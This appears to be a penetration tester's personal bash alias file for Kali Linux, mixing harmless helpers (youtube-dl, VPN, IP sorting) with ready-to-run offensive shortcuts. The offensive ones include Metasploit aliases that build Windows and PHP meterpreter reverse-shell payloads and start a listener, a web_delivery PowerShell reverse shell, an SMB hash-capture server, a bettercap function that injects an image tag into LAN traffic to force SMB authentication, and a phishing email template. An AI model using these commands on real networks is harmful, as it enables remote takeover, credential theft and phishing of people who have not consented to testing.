
# my personal aliases

	# easy open things on kali
	  alias open='/usr/bin/xdg-open'
	
	# http servers:
	  alias http='python -m SimpleHTTPServer 80'
	  alias https='python -m SimpleHTTPServer 443'

	# metasploit aliases:
	  alias handler='msfconsole -qx "use exploit/multi/handler; exploit"'
	  alias msfvenom-exe='/opt/metasploit/app/msfvenom -p windows/meterpreter/reverse_tcp -f exe'
	  alias msfvenom-php='/opt/metasploit/app/msfvenom -p php/meterpreter/reverse_tcp -f raw'
	  alias powershell='msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_tcp; set LHOST eth0; exploit"'
	  alias smb-capture='msfconsole -qx "workspace smb-capture; use auxiliary/server/capture/smb; set JOHNPWFILE smb-john-hashes;exploit"'
	
	
	# inject smb tag into lan traffic
    inject-smb(){
      local ip="$(hostname -I | awk '{print $1}')"	
      bettercap --proxy --proxy-module injecthtml --html-data "<img src='file://$ip/fun.jpg'/>"
    }

#	# old way to set up web_delivery with powershel thanks Lance ;)
#	powershell(){
#		local ip="$(hostname -I | awk '{print $1}')"
#		msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/powershell_reverse_tcp; set LHOST $ip; exploit"
#	}

	# misc aliases
	  alias sort-ip="sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4"

	# clean up typescripts
    typescript-clean(){
      cat "$1" | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b
    }

	# turn files into lists 
    listify(){ 
      sed 's/\s\+/\n/g' "$1" | sed '/^[[:space:]]*$/d' 
    }

	# text me
    alias textme="notify.py -att -m 'Yo' <INSERT PHONE NUMBER>"
    alias lookup-provider="textmetwilio-working.py"

	# phish template
  	alias phish="sendEmail -f <FROM EMAIL ADDRESS> -t <TO EMAIL ADDRESS> -u click -s smtp.gmail.com:587 -o tls=yes -xu <USERNAME> -xp <PASSWORD> -o message-content-type=html -o message-file=<PATH TO HTML FILE>"

	# youtube downloads requires youtube-dl
    alias youtube-mp4="youtube-dl --no-check-certificate -f 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/mp4'"
    alias youtube-mp3="youtube-dl --no-check-certificate --extract-audio --audio-format mp3 --audio-quality 0"

	# vpn aliases:
    alias vpn='openconnect --no-dtls --interface=sslvpn -c <FILE.p12> --authgroup <AUTHGROUP> -u <USERNAME> -p <CERT PASSWORD> <VPN SERVER>'
